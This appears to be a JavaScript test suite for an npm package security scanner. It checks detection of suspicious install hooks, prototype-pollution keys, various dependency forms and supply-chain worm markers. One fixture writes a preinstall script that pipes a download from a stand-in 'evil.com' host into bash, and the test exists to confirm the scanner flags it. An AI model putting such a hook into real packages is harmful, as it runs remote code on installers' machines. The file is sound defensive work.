const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, assertNotIncludes, runScan, runScanDirect, cleanupTemp, TESTS_DIR } = require('../test-utils');

async function runPackageTests() {
  console.log('\n=== PACKAGE.JSON TESTS ===\n');

  test('PACKAGE: Detects suspicious preinstall', () => {
    const output = runScan(path.join(TESTS_DIR, 'package'));
    assertIncludes(output, 'preinstall', 'Should detect preinstall');
  });

  test('PACKAGE: Detects suspicious postinstall', () => {
    const output = runScan(path.join(TESTS_DIR, 'package'));
    assertIncludes(output, 'postinstall', 'Should detect postinstall');
  });

  // --- bundledDependencies array handling ---

  await asyncTest('PACKAGE: Handles bundledDependencies array', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      bundledDependencies: ['safe-pkg']
    }));
    try {
      const result = await runScanDirect(tmp);
      // Should not crash, bundledDependencies should be processed
      assert(result && typeof result === 'object', 'Should return valid result');
    } finally { cleanupTemp(tmp); }
  });

  // --- DANGEROUS_KEYS filtering ---

  await asyncTest('PACKAGE: Skips __proto__ in dependencies (prototype pollution prevention)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { '__proto__': '1.0.0', 'constructor': '2.0.0' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const protoThreat = result.threats.find(t => t.message && t.message.includes('__proto__'));
      assert(!protoThreat, '__proto__ dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  // --- cleanVersionSpec ---

  await asyncTest('PACKAGE: Handles git URL dependency (skipped in IOC check)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'some-pkg': 'git+https://github.com/user/repo.git' }
    }));
    try {
      const result = await runScanDirect(tmp);
      // Should not crash on git URL
      assert(result && typeof result === 'object', 'Should handle git URL dependency');
    } finally { cleanupTemp(tmp); }
  });

  // --- Local dependency skip ---

  await asyncTest('PACKAGE: Skips local link: dependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'local-pkg': 'link:../local-pkg' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const localThreat = result.threats.find(t => t.message && t.message.includes('local-pkg'));
      assert(!localThreat, 'link: dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: Skips workspace: dependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'workspace-pkg': 'workspace:*' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const wsThreat = result.threats.find(t => t.message && t.message.includes('workspace-pkg'));
      assert(!wsThreat, 'workspace: dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  // --- Lifecycle shell pipe escalation ---

  await asyncTest('PACKAGE: Detects lifecycle shell pipe (curl|sh) as CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { preinstall: 'curl http://evil.com/setup.sh | bash' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle shell pipe');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- No package.json ---

  await asyncTest('PACKAGE: Returns empty threats for missing package.json', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'index.js'), '// nothing');
    try {
      const result = await runScanDirect(tmp);
      // No package.json, should not crash
      assert(result && typeof result === 'object', 'Should handle missing package.json');
    } finally { cleanupTemp(tmp); }
  });

  // --- devDependencies / optionalDependencies scanning ---

  await asyncTest('PACKAGE: Scans devDependencies and optionalDependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      devDependencies: { 'safe-dev': '1.0.0' },
      optionalDependencies: { 'safe-opt': '1.0.0' }
    }));
    try {
      const result = await runScanDirect(tmp);
      assert(result && typeof result === 'object', 'Should scan dev and optional deps without error');
    } finally { cleanupTemp(tmp); }
  });

  // Marker tests (grouped under package scanner)
  console.log('\n=== MARKER TESTS ===\n');

  test('MARKERS: Detects Shai-Hulud', () => {
    const output = runScan(path.join(TESTS_DIR, 'markers'));
    assertIncludes(output, 'Shai-Hulud', 'Should detect Shai-Hulud marker');
  });

  test('MARKERS: Detects The Second Coming', () => {
    const output = runScan(path.join(TESTS_DIR, 'markers'));
    assertIncludes(output, 'Second Coming', 'Should detect The Second Coming marker');
  });
}

module.exports = { runPackageTests };
